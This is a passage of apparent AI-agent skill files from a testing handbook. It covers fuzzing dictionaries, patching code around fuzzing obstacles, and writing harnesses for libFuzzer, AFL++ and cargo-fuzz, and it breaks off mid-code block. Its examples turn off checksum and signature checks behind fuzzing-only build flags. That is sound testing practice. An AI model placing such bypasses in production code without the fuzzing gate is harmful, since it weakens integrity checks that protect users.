|\n|-------|----------------|\n| **libfuzzer** | Native dictionary support via `-dict=` flag |\n| **aflpp** | Native dictionary support via `-x` flag; auto-generation with AUTODICTIONARIES |\n| **cargo-fuzz** | Uses libFuzzer backend, inherits `-dict=` support |\n\n### Related Techniques\n\n| Skill | Relationship |\n|-------|--------------|\n| **fuzzing-corpus** | Dictionaries complement corpus: corpus provides structure, dictionary provides keywords |\n| **coverage-analysis** | Use coverage data to validate dictionary effectiveness |\n| **harness-writing** | Harness structure determines which dictionary tokens are useful |\n\n## Resources\n\n### Key External Resources\n\n**[AFL++ Dictionaries](https://github.com/AFLplusplus/AFLplusplus/tree/stable/dictionaries)**\nPre-built dictionaries for common formats (HTML, XML, JSON, SQL, etc.). Good starting point for format-specific fuzzing.\n\n**[libFuzzer Dictionary Documentation](https://llvm.org/docs/LibFuzzer.html#dictionaries)**\nOfficial libFuzzer documentation on dictionary format and usage. Explains token insertion strategy and performance implications.\n\n### Additional Examples\n\n**[OSS-Fuzz Dictionaries](https://github.com/google/oss-fuzz/tree/master/projects)**\nReal-world dictionaries from Google's continuous fuzzing service. Search project directories for `*.dict` files to see production examples.\n",
        "plugins/testing-handbook-skills/skills/fuzzing-obstacles/SKILL.md": "---\nname: fuzzing-obstacles\ntype: technique\ndescription: >\n  Techniques for patching code to overcome fuzzing obstacles.\n  Use when checksums, global state, or other barriers block fuzzer progress.\n---\n\n# Overcoming Fuzzing Obstacles\n\nCodebases often contain anti-fuzzing patterns that prevent effective coverage. Checksums, global state (like time-seeded PRNGs), and validation checks can block the fuzzer from exploring deeper code paths. This technique shows how to patch your System Under Test (SUT) to bypass these obstacles during fuzzing while preserving production behavior.\n\n## Overview\n\nMany real-world programs were not designed with fuzzing in mind. They may:\n- Verify checksums or cryptographic hashes before processing input\n- Rely on global state (e.g., system time, environment variables)\n- Use non-deterministic random number generators\n- Perform complex validation that makes it difficult for the fuzzer to generate valid inputs\n\nThese patterns make fuzzing difficult because:\n1. **Checksums:** The fuzzer must guess correct hash values (astronomically unlikely)\n2. **Global state:** Same input produces different behavior across runs (breaks determinism)\n3. **Complex validation:** The fuzzer spends effort hitting validation failures instead of exploring deeper code\n\nThe solution is conditional compilation: modify code behavior during fuzzing builds while keeping production code unchanged.\n\n### Key Concepts\n\n| Concept | Description |\n|---------|-------------|\n| SUT Patching | Modifying System Under Test to be fuzzing-friendly |\n| Conditional Compilation | Code that behaves differently based on compile-time flags |\n| Fuzzing Build Mode | Special build configuration that enables fuzzing-specific patches |\n| False Positives | Crashes found during fuzzing that cannot occur in production |\n| Determinism | Same input always produces same behavior (critical for fuzzing) |\n\n## When to Apply\n\n**Apply this technique when:**\n- The fuzzer gets stuck at checksum or hash verification\n- Coverage reports show large blocks of unreachable code behind validation\n- Code uses time-based seeds or other non-deterministic global state\n- Complex validation makes it nearly impossible to generate valid inputs\n- You see the fuzzer repeatedly hitting the same validation failures\n\n**Skip this technique when:**\n- The obstacle can be overcome with a good seed corpus or dictionary\n- The validation is simple enough for the fuzzer to learn (e.g., magic bytes)\n- You're doing grammar-based or structure-aware fuzzing that handles validation\n- Skipping the check would introduce too many false positives\n- The code is already fuzzing-friendly\n\n## Quick Reference\n\n| Task | C/C++ | Rust |\n|------|-------|------|\n| Check if fuzzing build | `#ifdef FUZZING_BUILD_MODE_UNSAFE_FOR_PRODUCTION` | `cfg!(fuzzing)` |\n| Skip check during fuzzing | `#ifndef FUZZING_BUILD_MODE_UNSAFE_FOR_PRODUCTION return -1; #endif` | `if !cfg!(fuzzing) { return Err(...) }` |\n| Common obstacles | Checksums, PRNGs, time-based logic | Checksums, PRNGs, time-based logic |\n| Supported fuzzers | libFuzzer, AFL++, LibAFL, honggfuzz | cargo-fuzz, libFuzzer |\n\n## Step-by-Step\n\n### Step 1: Identify the Obstacle\n\nRun the fuzzer and analyze coverage to find code that's unreachable. Common patterns:\n\n1. Look for checksum/hash verification before deeper processing\n2. Check for calls to `rand()`, `time()`, or `srand()` with system seeds\n3. Find validation functions that reject most inputs\n4. Identify global state initialization that differs across runs\n\n**Tools to help:**\n- Coverage reports (see coverage-analysis technique)\n- Profiling with `-fprofile-instr-generate`\n- Manual code inspection of entry points\n\n### Step 2: Add Conditional Compilation\n\nModify the obstacle to bypass it during fuzzing builds.\n\n**C/C++ Example:**\n\n```c++\n// Before: Hard obstacle\nif (checksum != expected_hash) {\n    return -1;  // Fuzzer never gets past here\n}\n\n// After: Conditional bypass\nif (checksum != expected_hash) {\n#ifndef FUZZING_BUILD_MODE_UNSAFE_FOR_PRODUCTION\n    return -1;  // Only enforced in production\n#endif\n}\n// Fuzzer can now explore code beyond this check\n```\n\n**Rust Example:**\n\n```rust\n// Before: Hard obstacle\nif checksum != expected_hash {\n    return Err(MyError::Hash);  // Fuzzer never gets past here\n}\n\n// After: Conditional bypass\nif checksum != expected_hash {\n    if !cfg!(fuzzing) {\n        return Err(MyError::Hash);  // Only enforced in production\n    }\n}\n// Fuzzer can now explore code beyond this check\n```\n\n### Step 3: Verify Coverage Improvement\n\nAfter patching:\n\n1. Rebuild with fuzzing instrumentation\n2. Run the fuzzer for a short time\n3. Compare coverage to the unpatched version\n4. Confirm new code paths are being explored\n\n### Step 4: Assess False Positive Risk\n\nConsider whether skipping the check introduces impossible program states:\n\n- Does code after the check assume validated properties?\n- Could skipping validation cause crashes that cannot occur in production?\n- Is there implicit state dependency?\n\nIf false positives are likely, consider a more targeted patch (see Common Patterns below).\n\n## Common Patterns\n\n### Pattern: Bypass Checksum Validation\n\n**Use Case:** Hash/checksum blocks all fuzzer progress\n\n**Before:**\n```c++\nuint32_t computed = hash_function(data, size);\nif (computed != expected_checksum) {\n    return ERROR_INVALID_HASH;\n}\nprocess_data(data, size);\n```\n\n**After:**\n```c++\nuint32_t computed = hash_function(data, size);\nif (computed != expected_checksum) {\n#ifndef FUZZING_BUILD_MODE_UNSAFE_FOR_PRODUCTION\n    return ERROR_INVALID_HASH;\n#endif\n}\nprocess_data(data, size);\n```\n\n**False positive risk:** LOW - If data processing doesn't depend on checksum correctness\n\n### Pattern: Deterministic PRNG Seeding\n\n**Use Case:** Non-deterministic random state prevents reproducibility\n\n**Before:**\n```c++\nvoid initialize() {\n    srand(time(NULL));  // Different seed each run\n}\n```\n\n**After:**\n```c++\nvoid initialize() {\n#ifdef FUZZING_BUILD_MODE_UNSAFE_FOR_PRODUCTION\n    srand(12345);  // Fixed seed for fuzzing\n#else\n    srand(time(NULL));\n#endif\n}\n```\n\n**False positive risk:** LOW - Fuzzer can explore all code paths with fixed seed\n\n### Pattern: Careful Validation Skip\n\n**Use Case:** Validation must be skipped but downstream code has assumptions\n\n**Before (Dangerous):**\n```c++\n#ifndef FUZZING_BUILD_MODE_UNSAFE_FOR_PRODUCTION\nif (!validate_config(&config)) {\n    return -1;  // Ensures config.x != 0\n}\n#endif\n\nint32_t result = 100 / config.x;  // CRASH: Division by zero in fuzzing!\n```\n\n**After (Safe):**\n```c++\n#ifndef FUZZING_BUILD_MODE_UNSAFE_FOR_PRODUCTION\nif (!validate_config(&config)) {\n    return -1;\n}\n#else\n// During fuzzing, use safe defaults for failed validation\nif (!validate_config(&config)) {\n    config.x = 1;  // Prevent division by zero\n    config.y = 1;\n}\n#endif\n\nint32_t result = 100 / config.x;  // Safe in both builds\n```\n\n**False positive risk:** MITIGATED - Provides safe defaults instead of skipping\n\n### Pattern: Bypass Complex Format Validation\n\n**Use Case:** Multi-step validation makes valid input generation nearly impossible\n\n**Rust Example:**\n\n```rust\n// Before: Multiple validation stages\npub fn parse_message(data: &[u8]) -> Result<Message, Error> {\n    validate_magic_bytes(data)?;\n    validate_structure(data)?;\n    validate_checksums(data)?;\n    validate_crypto_signature(data)?;\n\n    deserialize_message(data)\n}\n\n// After: Skip expensive validation during fuzzing\npub fn parse_message(data: &[u8]) -> Result<Message, Error> {\n    validate_magic_bytes(data)?;  // Keep cheap checks\n\n    if !cfg!(fuzzing) {\n        validate_structure(data)?;\n        validate_checksums(data)?;\n        validate_crypto_signature(data)?;\n    }\n\n    deserialize_message(data)\n}\n```\n\n**False positive risk:** MEDIUM - Deserialization must handle malformed data gracefully\n\n## Advanced Usage\n\n### Tips and Tricks\n\n| Tip | Why It Helps |\n|-----|--------------|\n| Keep cheap validation | Magic bytes and size checks guide fuzzer without much cost |\n| Use fixed seeds for PRNGs | Makes behavior deterministic while exploring all code paths |\n| Patch incrementally | Skip one obstacle at a time and measure coverage impact |\n| Add defensive defaults | When skipping validation, provide safe fallback values |\n| Document all patches | Future maintainers need to understand fuzzing vs. production differences |\n\n### Real-World Examples\n\n**OpenSSL:** Uses `FUZZING_BUILD_MODE_UNSAFE_FOR_PRODUCTION` to modify cryptographic algorithm behavior. For example, in [crypto/cmp/cmp_vfy.c](https://github.com/openssl/openssl/blob/afb19f07aecc84998eeea56c4d65f5e0499abb5a/crypto/cmp/cmp_vfy.c#L665-L678), certain signature checks are relaxed during fuzzing to allow deeper exploration of certificate validation logic.\n\n**ogg crate (Rust):** Uses `cfg!(fuzzing)` to [skip checksum verification](https://github.com/RustAudio/ogg/blob/5ee8316e6e907c24f6d7ec4b3a0ed6a6ce854cc1/src/reading.rs#L298-L300) during fuzzing. This allows the fuzzer to explore audio processing code without spending effort guessing correct checksums.\n\n### Measuring Patch Effectiveness\n\nAfter applying patches, quantify the improvement:\n\n1. **Line coverage:** Use `llvm-cov` or `cargo-cov` to see new reachable lines\n2. **Basic block coverage:** More fine-grained than line coverage\n3. **Function coverage:** How many more functions are now reachable?\n4. **Corpus size:** Does the fuzzer generate more diverse inputs?\n\nEffective patches typically increase coverage by 10-50% or more.\n\n### Combining with Other Techniques\n\nObstacle patching works well with:\n- **Corpus seeding:** Provide valid inputs that get past initial parsing\n- **Dictionaries:** Help fuzzer learn magic bytes and common values\n- **Structure-aware fuzzing:** Use protobuf or grammar definitions for complex formats\n- **Harness improvements:** Better harness can sometimes avoid obstacles entirely\n\n## Anti-Patterns\n\n| Anti-Pattern | Problem | Correct Approach |\n|--------------|---------|------------------|\n| Skip all validation wholesale | Creates false positives and unstable fuzzing | Skip only specific obstacles that block coverage |\n| No risk assessment | False positives waste time and hide real bugs | Analyze downstream code for assumptions |\n| Forget to document patches | Future maintainers don't understand the differences | Add comments explaining why patch is safe |\n| Patch without measuring | Don't know if it helped | Compare coverage before and after |\n| Over-patching | Makes fuzzing build diverge too much from production | Minimize differences between builds |\n\n## Tool-Specific Guidance\n\n### libFuzzer\n\nlibFuzzer automatically defines `FUZZING_BUILD_MODE_UNSAFE_FOR_PRODUCTION` during compilation.\n\n```bash\n# C++ compilation\nclang++ -g -fsanitize=fuzzer,address -DFUZZING_BUILD_MODE_UNSAFE_FOR_PRODUCTION \\\n    harness.cc target.cc -o fuzzer\n\n# The macro is usually defined automatically by -fsanitize=fuzzer\nclang++ -g -fsanitize=fuzzer,address harness.cc target.cc -o fuzzer\n```\n\n**Integration tips:**\n- The macro is defined automatically; manual definition is usually unnecessary\n- Use `#ifdef` to check for the macro\n- Combine with sanitizers to detect bugs in newly reachable code\n\n### AFL++\n\nAFL++ also defines `FUZZING_BUILD_MODE_UNSAFE_FOR_PRODUCTION` when using its compiler wrappers.\n\n```bash\n# Compilation with AFL++ wrappers\nafl-clang-fast++ -g -fsanitize=address target.cc harness.cc -o fuzzer\n\n# The macro is defined automatically by afl-clang-fast\n```\n\n**Integration tips:**\n- Use `afl-clang-fast` or `afl-clang-lto` for automatic macro definition\n- Persistent mode harnesses benefit most from obstacle patching\n- Consider using `AFL_LLVM_LAF_ALL` for additional input-to-state transformations\n\n### honggfuzz\n\nhonggfuzz also supports the macro when building targets.\n\n```bash\n# Compilation\nhfuzz-clang++ -g -fsanitize=address target.cc harness.cc -o fuzzer\n```\n\n**Integration tips:**\n- Use `hfuzz-clang` or `hfuzz-clang++` wrappers\n- The macro is available for conditional compilation\n- Combine with honggfuzz's feedback-driven fuzzing\n\n### cargo-fuzz (Rust)\n\ncargo-fuzz automatically sets the `fuzzing` cfg option during builds.\n\n```bash\n# Build fuzz target (cfg!(fuzzing) is automatically set)\ncargo fuzz build fuzz_target_name\n\n# Run fuzz target\ncargo fuzz run fuzz_target_name\n```\n\n**Integration tips:**\n- Use `cfg!(fuzzing)` for runtime checks in production builds\n- Use `#[cfg(fuzzing)]` for compile-time conditional compilation\n- The fuzzing cfg is only set during `cargo fuzz` builds, not regular `cargo build`\n- Can be manually enabled with `RUSTFLAGS=\"--cfg fuzzing\"` for testing\n\n### LibAFL\n\nLibAFL supports the C/C++ macro for targets written in C/C++.\n\n```bash\n# Compilation\nclang++ -g -fsanitize=address -DFUZZING_BUILD_MODE_UNSAFE_FOR_PRODUCTION \\\n    target.cc -c -o target.o\n```\n\n**Integration tips:**\n- Define the macro manually or use compiler flags\n- Works the same as with libFuzzer\n- Useful when building custom LibAFL-based fuzzers\n\n## Troubleshooting\n\n| Issue | Cause | Solution |\n|-------|-------|----------|\n| Coverage doesn't improve after patching | Wrong obstacle identified | Profile execution to find actual bottleneck |\n| Many false positive crashes | Downstream code has assumptions | Add defensive defaults or partial validation |\n| Code compiles differently | Macro not defined in all build configs | Verify macro in all source files and dependencies |\n| Fuzzer finds bugs in patched code | Patch introduced invalid states | Review patch for state invariants; consider safer approach |\n| Can't reproduce production bugs | Build differences too large | Minimize patches; keep validation for state-critical checks |\n\n## Related Skills\n\n### Tools That Use This Technique\n\n| Skill | How It Applies |\n|-------|----------------|\n| **libfuzzer** | Defines `FUZZING_BUILD_MODE_UNSAFE_FOR_PRODUCTION` automatically |\n| **aflpp** | Supports the macro via compiler wrappers |\n| **honggfuzz** | Uses the macro for conditional compilation |\n| **cargo-fuzz** | Sets `cfg!(fuzzing)` for Rust conditional compilation |\n\n### Related Techniques\n\n| Skill | Relationship |\n|-------|--------------|\n| **fuzz-harness-writing** | Better harnesses may avoid obstacles; patching enables deeper exploration |\n| **coverage-analysis** | Use coverage to identify obstacles and measure patch effectiveness |\n| **corpus-seeding** | Seed corpus can help overcome obstacles without patching |\n| **dictionary-generation** | Dictionaries help with magic bytes but not checksums or complex validation |\n\n## Resources\n\n### Key External Resources\n\n**[OpenSSL Fuzzing Documentation](https://github.com/openssl/openssl/tree/master/fuzz)**\nOpenSSL's fuzzing infrastructure demonstrates large-scale use of `FUZZING_BUILD_MODE_UNSAFE_FOR_PRODUCTION`. The project uses this macro to modify cryptographic validation, certificate parsing, and other security-critical code paths to enable deeper fuzzing while maintaining production correctness.\n\n**[LibFuzzer Documentation on Flags](https://llvm.org/docs/LibFuzzer.html)**\nOfficial LLVM documentation for libFuzzer, including how the fuzzer defines compiler macros and how to use them effectively. Covers integration with sanitizers and coverage instrumentation.\n\n**[Rust cfg Attribute Reference](https://doc.rust-lang.org/reference/conditional-compilation.html)**\nComplete reference for Rust conditional compilation, including `cfg!(fuzzing)` and `cfg!(test)`. Explains compile-time vs. runtime conditional compilation and best practices.\n",
        "plugins/testing-handbook-skills/skills/harness-writing/SKILL.md": "---\nname: harness-writing\ntype: technique\ndescription: >\n  Techniques for writing effective fuzzing harnesses across languages.\n  Use when creating new fuzz targets or improving existing harness code.\n---\n\n# Writing Fuzzing Harnesses\n\nA fuzzing harness is the entrypoint function that receives random data from the fuzzer and routes it to your system under test (SUT). The quality of your harness directly determines which code paths get exercised and whether critical bugs are found. A poorly written harness can miss entire subsystems or produce non-reproducible crashes.\n\n## Overview\n\nThe harness is the bridge between the fuzzer's random byte generation and your application's API. It must parse raw bytes into meaningful inputs, call target functions, and handle edge cases gracefully. The most important part of any fuzzing setup is the harnessif written poorly, critical parts of your application may not be covered.\n\n### Key Concepts\n\n| Concept | Description |\n|---------|-------------|\n| **Harness** | Function that receives fuzzer input and calls target code under test |\n| **SUT** | System Under Testthe code being fuzzed |\n| **Entry point** | Function signature required by the fuzzer (e.g., `LLVMFuzzerTestOneInput`) |\n| **FuzzedDataProvider** | Helper class for structured extraction of typed data from raw bytes |\n| **Determinism** | Property that ensures same input always produces same behavior |\n| **Interleaved fuzzing** | Single harness that exercises multiple operations based on input |\n\n## When to Apply\n\n**Apply this technique when:**\n- Creating a new fuzz target for the first time\n- Fuzz campaign has low code coverage or isn't finding bugs\n- Crashes found during fuzzing are not reproducible\n- Target API requires complex or structured inputs\n- Multiple related functions should be tested together\n\n**Skip this technique when:**\n- Using existing well-tested harnesses from your project\n- Tool provides automatic harness generation that meets your needs\n- Target already has comprehensive fuzzing infrastructure\n\n## Quick Reference\n\n| Task | Pattern |\n|------|---------|\n| Minimal C++ harness | `extern \"C\" int LLVMFuzzerTestOneInput(const uint8_t* data, size_t size)` |\n| Minimal Rust harness | `fuzz_target!(|data: &[u8]| { ... })` |\n| Size validation | `if (size < MIN_SIZE) return 0;` |\n| Cast to integers | `uint32_t val = *(uint32_t*)(data);` |\n| Use FuzzedDataProvider | `FuzzedDataProvider fuzzed_data(data, size);` |\n| Extract typed data (C++) | `auto val = fuzzed_data.ConsumeIntegral<uint32_t>();` |\n| Extract string (C++) | `auto str = fuzzed_data.ConsumeBytesWithTerminator<char>(32, 0xFF);` |\n\n## Step-by-Step\n\n### Step 1: Identify Entry Points\n\nFind functions in your codebase that:\n- Accept external input (parsers, validators, protocol handlers)\n- Parse complex data formats (JSON, XML, binary protocols)\n- Perform security-critical operations (authentication, cryptography)\n- Have high cyclomatic complexity or many branches\n\nGood targets are typically:\n- Protocol parsers\n- File format parsers\n- Serialization/deserialization functions\n- Input validation routines\n\n### Step 2: Write Minimal Harness\n\nStart with the simplest possible harness that calls your target function:\n\n**C/C++:**\n```cpp\nextern \"C\" int LLVMFuzzerTestOneInput(const uint8_t *data, size_t size) {\n    target_function(data, size);\n    return 0;\n}\n```\n\n**Rust:**\n```rust\n#![no_main]\nuse libfuzzer_sys::fuzz_target;\n\nfuzz_target!(|data: &[u8]| {\n    target_function(data);\n});\n```\n\n### Step 3: Add Input Validation\n\nReject inputs that are too small or too large to be meaningful:\n\n```cpp\nextern \"C\" int LLVMFuzzerTestOneInput(const uint8_t *data, size_t size) {\n    // Ensure minimum size for meaningful input\n    if (size < MIN_INPUT_SIZE || size > MAX_INPUT_SIZE) {\n        return 0;\n    }\n    target_function(data, size);\n    return 0;\n}\n```\n\n**Rationale:** The fuzzer generates random inputs of all sizes. Your harness must handle empty, tiny, huge, or malformed inputs without causing unexpected issues in the harness itself (crashes in the SUT are finethat's what we're looking for).\n\n### Step 4: Structure the Input\n\nFor APIs that require typed data (integers, strings, etc.), use casting or helpers like `FuzzedDataProvider`:\n\n**Simple casting:**\n```cpp\nextern \"C\" int LLVMFuzzerTestOneInput(const uint8_t *data, size_t size) {\n    if (size != 2 * sizeof(uint32_t)) {\n        return 0;\n    }\n\n    uint32_t numerator = *(uint32_t*)(data);\n    uint32_t denominator = *(uint32_t*)(data + sizeof(uint32_t));\n\n    divide(numerator, denominator);\n    return 0;\n}\n```\n\n**Using FuzzedDataProvider:**\n```cpp\n#include \"FuzzedDataProvider.h\"\n\nextern \"C\" int LLVMFuzzerTestOneInput(const uint8_t *data, size_t size) {\n    FuzzedDataProvider fuzzed_data(data, size);\n\n    size_t allocation_size = fuzzed_data.ConsumeIntegral<size_t>();\n    std::vector<char> str1 = fuzzed_data.ConsumeBytesWithTerminator<char>(32, 0xFF);\n    std::vector<char> str2 = fuzzed_data.ConsumeBytesWithTerminator<char>(32, 0xFF);\n\n    concat(&str1[0], str1.size(), &str2[0], str2.size(), allocation_size);\n    return 0;\n}\n```\n\n### Step 5: Test and Iterate\n\nRun the fuzzer and monitor:\n- Code coverage (are all interesting paths reached?)\n- Executions per second (is it fast enough?)\n- Crash reproducibility (can you reproduce crashes with saved inputs?)\n\nIterate on the harness to improve these metrics.\n\n## Common Patterns\n\n### Pattern: Beyond Byte ArraysCasting to Integers\n\n**Use Case:** When target expects primitive types like integers or floats\n\n**Implementation:**\n```cpp\nextern \"C\" int LLVMFuzzerTestOneInput(const uint8_t *data, size_t size) {\n    // Ensure exactly 2 4-byte numbers\n    if (size != 2 * sizeof(uint32_t)) {\n        return 0;\n    }\n\n    // Split input into two integers\n    uint32_t numerator = *(uint32_t*)(data);\n    uint32_t denominator = *(uint32_t*)(data + sizeof(uint32_t));\n\n    divide(numerator, denominator);\n    return 0;\n}\n```\n\n**Rust equivalent:**\n```rust\nfuzz_target!(|data: &[u8]| {\n    if data.len() != 2 * std::mem::size_of::<i32>() {\n        return;\n    }\n\n    let numerator = i32::from_ne_bytes([data[0], data[1], data[2], data[3]]);\n    let denominator = i32::from_ne_bytes([data[4], data[5], data[6], data[7]]);\n\n    divide(numerator, denominator);\n});\n```\n\n**Why it works:** Any 8-byte input is valid. The fuzzer learns that inputs must be exactly 8 bytes, and every bit flip produces a new, potentially interesting input.\n\n### Pattern: FuzzedDataProvider for Complex Inputs\n\n**Use Case:** When target requires multiple strings, integers, or variable-length data\n\n**Implementation:**\n```cpp\n#include \"FuzzedDataProvider.h\"\n\nextern \"C\" int LLVMFuzzerTestOneInput(const uint8_t *data, size_t size) {\n    FuzzedDataProvider fuzzed_data(data, size);\n\n    // Extract different types of data\n    size_t allocation_size = fuzzed_data.ConsumeIntegral<size_t>();\n\n    // Consume variable-length strings with terminator\n    std::vector<char> str1 = fuzzed_data.ConsumeBytesWithTerminator<char>(32, 0xFF);\n    std::vector<char> str2 = fuzzed_data.ConsumeBytesWithTerminator<char>(32, 0xFF);\n\n    char* result = concat(&str1[0], str1.size(), &str2[0], str2.size(), allocation_size);\n    if (result != NULL) {\n        free(result);\n    }\n\n    return 0;\n}\n```\n\n**Why it helps:** `FuzzedDataProvider` handles the complexity of extracting structured data from a byte stream. It's particularly useful for APIs that need multiple parameters of different types.\n\n### Pattern: Interleaved Fuzzing\n\n**Use Case:** When multiple related operations should be tested in a single harness\n\n**Implementation:**\n```cpp\nextern \"C\" int LLVMFuzzerTestOneInput(const uint8_t *data, size_t size) {\n    if (size < 1 + 2 * sizeof(int32_t)) {\n        return 0;\n    }\n\n    // First byte selects operation\n    uint8_t mode = data[0];\n\n    // Next bytes are operands\n    int32_t numbers[2];\n    memcpy(numbers, data + 1, 2 * sizeof(int32_t));\n\n    int32_t result = 0;\n    switch (mode % 4) {\n        case 0:\n            result = add(numbers[0], numbers[1]);\n            break;\n        case 1:\n            result = subtract(numbers[0], numbers[1]);\n            break;\n        case 2:\n            result = multiply(numbers[0], numbers[1]);\n            break;\n        case 3:\n            result = divide(numbers[0], numbers[1]);\n            break;\n    }\n\n    // Prevent compiler from optimizing away the calls\n    printf(\"%d\", result);\n    return 0;\n}\n```\n\n**Advantages:**\n- Faster to write one harness than multiple individual harnesses\n- Single shared corpus means interesting inputs for one operation may be interesting for others\n- Can discover bugs in interactions between operations\n\n**When to use:**\n- Operations share similar input types\n- Operations are logically related (e.g., arithmetic operations, CRUD operations)\n- Single corpus makes sense across all operations\n\n### Pattern: Structure-Aware Fuzzing with Arbitrary (Rust)\n\n**Use Case:** When fuzzing Rust code that uses custom structs\n\n**Implementation:**\n```rust\nuse arbitrary::Arbitrary;\n\n#[derive(Debug, Arbitrary)]\npub struct Name {\n    data: String\n}\n\nimpl Name {\n    pub fn check_buf(&self) {\n        let data = self.data.as_bytes();\n        if data.len() > 0 && data[0] == b'a' {\n            if data.len() > 1 && data[1] == b'b' {\n                if data.len() > 2 && data[2] == b'c' {\n                    process::abort();\n                }\n            }\n        }\n    }\n}\n```\n\n**Harness with arbitrary:**\n```rust\n#![no_main]\nuse libfuzzer_sys::fuzz_target;\n\nfuzz_target!(|data: your_project::Name| {\n    data.check_buf();\n});\n```\n\n**Add to Cargo.toml:**\n```toml\n[dependencies]\narbitrary = { version = \"1\", features = [\"derive\"] }\n```\n\n**Why it helps:** The `arbitrary` crate automatically handles deserialization of raw bytes into your Rust structs, reducing boilerplate and ensuring valid struct construction.\n\n**Limitation:** The arbitrary crate doesn't offer reverse serialization, so you can't manually construct byte arrays that map to specific structs. This works best when starting from an empty corpus (fine for libFuzzer, problematic for AFL++).\n\n## Advanced Usage\n\n### Tips and Tricks\n\n| Tip | Why It Helps |\n|-----|--------------|\n| **Start with parsers** | High bug density, clear entry points, easy to harness |\n| **Mock I/O operations** | Prevents hangs from blocking I/O, enables determinism |\n| **Use FuzzedDataProvider** | Simplifies extraction of structured data from raw bytes |\n| **Reset global state** | Ensures each iteration is independent and reproducible |\n| **Free resources in harness** | Prevents memory exhaustion during long campaigns |\n| **Avoid logging in harness** | Logging is slowfuzzing needs 100s-1000s exec/sec |\n| **Test harness manually first** | Run harness with known inputs before starting campaign |\n| **Check coverage early** | Ensure harness reaches expected code paths |\n\n### Structure-Aware Fuzzing with Protocol Buffers\n\nFor highly structured input formats, consider using Protocol Buffers as an intermediate format with custom mutators:\n\n```cpp\n// Define your input format in .proto file\n// Use libprotobuf-mutator to generate valid mutations\n// This ensures fuzzer mutates message contents, not the protobuf encoding itself\n```\n\nThis approach is more setup but prevents the fuzzer from wasting time on unparseable inputs. See [structure-aware fuzzing documentation](https://github.com/google/fuzzing/blob/master/docs/structure-aware-fuzzing.md) for details.\n\n### Handling Non-Determinism\n\n**Problem:** Random values or timing dependencies cause non-reproducible crashes.\n\n**Solutions:**\n- Replace `rand()` with deterministic PRNG seeded from fuzzer input:\n  ```cpp\n  uint32_t seed = fuzzed_data.ConsumeIntegral<uint32_t>();\n  srand(seed);\n  ```\n- Mock system calls that return time, PIDs, or random data\n- Avoid reading from `/dev/random` or `/dev/urandom`\n\n### Resetting Global State\n\nIf your SUT uses global state (singletons, static variables), reset it between iterations:\n\n```cpp\nextern \"C\" int LLVMFuzzerTestOneInput(const uint8_t *data, size_t size) {\n    // Reset global state before each iteration\n    global_reset();\n\n    target_function(data, size);\n\n    // Clean up resources\n    global_cleanup();\n    return 0;\n}\n```\n\n**Rationale:** Global state can cause crashes after N iterations rather than on a specific input, making bugs non-reproducible.\n\n## Practical Harness Rules\n\nFollow these rules to ensure effective fuzzing harnesses:\n\n| Rule | Rationale |\n|------|-----------|\n| **Handle all input sizes** | Fuzzer generates empty, tiny, huge inputsharness must handle gracefully |\n| **Never call `exit()`** | Calling `exit()` stops the fuzzer process. Use `abort()` in SUT if needed |\n| **Join all threads** | Each iteration must run to completion before next iteration starts |\n| **Be fast** | Aim for 100s-1000s executions/sec. Avoid logging, high complexity, excess memory |\n| **Maintain determinism** | Same input must always produce same behavior for reproducibility |\n| **Avoid global state** | Global state reduces reproducibilityreset between iterations if unavoidable |\n| **Use narrow targets** | Don't fuzz PNG and TCP in same harnessdifferent formats need separate targets |\n| **Free resources** | Prevent memory leaks that cause resource exhaustion during long campaigns |\n\n**Note:** These guidelines apply not just to harness code, but to the entire SUT. If the SUT violates these rules, consider patching it (see the fuzzing obstacles technique).\n\n## Anti-Patterns\n\n| Anti-Pattern | Problem | Correct Approach |\n|--------------|---------|------------------|\n| **Global state without reset** | Non-deterministic crashes | Reset all globals at start of harness |\n| **Blocking I/O or network calls** | Hangs fuzzer, wastes time | Mock I/O, use in-memory buffers |\n| **Memory leaks in harness** | Resource exhaustion kills campaign | Free all allocations before returning |\n| **Calling `exit()` in SUT** | Stops entire fuzzing process | Use `abort()` or return error codes |\n| **Heavy logging in harness** | Reduces exec/sec by orders of magnitude | Disable logging during fuzzing |\n| **Too many operations per iteration** | Slows down fuzzer | Keep iterations fast and focused |\n| **Mixing unrelated input formats** | Corpus entries not useful across formats | Separate harnesses for different formats |\n| **Not validating input size** | Harness crashes on edge cases | Check `size` before accessing `data` |\n\n## Tool-Specific Guidance\n\n### libFuzzer\n\n**Harness signature:**\n```cpp\nextern \"C\" int LLVMFuzzerTestOneInput(const uint8_t *data, size_t size) {\n    // Your code here\n    return 0;  // Non-zero return is reserved for future use\n}\n```\n\n**Compilation:**\n```bash\nclang++ -fsanitize=fuzzer,address -g harness.cc -o fuzz_target\n```\n\n**Integration tips:**\n- Use `FuzzedDataProvider.h` for structured input extraction\n- Compile with `-fsanitize=fuzzer` to link the fuzzing runtime\n- Add sanitizers (`-fsanitize=address,undefined`) to detect more bugs\n- Use `-g` for better stack traces when crashes occur\n- libFuzzer can start with empty corpusno seed inputs required\n\n**Running:**\n```bash\n./fuzz_target corpus_dir/\n```\n\n**Resources:**\n- [FuzzedDataProvider header](https://github.com/llvm/llvm-project/blob/main/compiler-rt/include/fuzzer/FuzzedDataProvider.h)\n- [libFuzzer documentation](https://llvm.org/docs/LibFuzzer.html)\n\n### AFL++\n\nAFL++ supports multiple harness styles. For best performance, use persistent mode:\n\n**Persistent mode harness:**\n```cpp\n#include <unistd.h>\n\nint main(int argc, char **argv) {\n    #ifdef __AFL_HAVE_MANUAL_CONTROL\n        __AFL_INIT();\n    #endif\n\n    unsigned char buf[MAX_SIZE];\n\n    while (__AFL_LOOP(10000)) {\n        // Read input from stdin\n        ssize_t len = read(0, buf, sizeof(buf));\n        if (len <= 0) break;\n\n        // Call target function\n        target_function(buf, len);\n    }\n\n    return 0;\n}\n```\n\n**Compilation:**\n```bash\nafl-clang-fast++ -g harness.cc -o fuzz_target\n```\n\n**Integration tips:**\n- Use persistent mode (`__AFL_LOOP`) for 10-100x speedup\n- Consider deferred initialization (`__AFL_INIT()`) to skip setup overhead\n- AFL++ requires at least one seed input in the corpus directory\n- Use `AFL_USE_ASAN=1` or `AFL_USE_UBSAN=1` for sanitizer builds\n\n**Running:**\n```bash\nafl-fuzz -i seeds/ -o findings/ -- ./fuzz_target\n```\n\n### cargo-fuzz (Rust)\n\n**Harness signature:**\n```rust\n#![no_main]\nuse libfuzzer_sys::fuzz_target;\n\nfuzz_target!(|data: &[u8]| {\n    // Your code here\n});\n```\n\n**With structured input (arbitrary crate):**\n```rust\n#![no_main]\nuse 